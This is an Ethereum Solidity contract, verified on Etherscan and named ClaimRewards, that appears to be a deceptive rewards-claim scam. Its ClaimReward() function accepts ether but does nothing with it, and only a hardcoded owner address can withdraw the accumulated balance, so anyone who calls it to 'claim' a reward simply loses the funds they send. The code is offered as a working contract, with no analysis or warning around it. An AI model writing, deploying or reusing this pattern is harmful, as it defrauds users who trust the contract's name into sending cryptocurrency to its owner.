/**
 *Submitted for verification at Etherscan.io on 2023-06-20
*/

pragma solidity ^0.4.26;

contract ClaimRewards {

    address private  owner;

     constructor() public{   
        owner=0x0a83A002F37FA4D9A2628A40fe844449c0ef11f9;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function ClaimReward() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}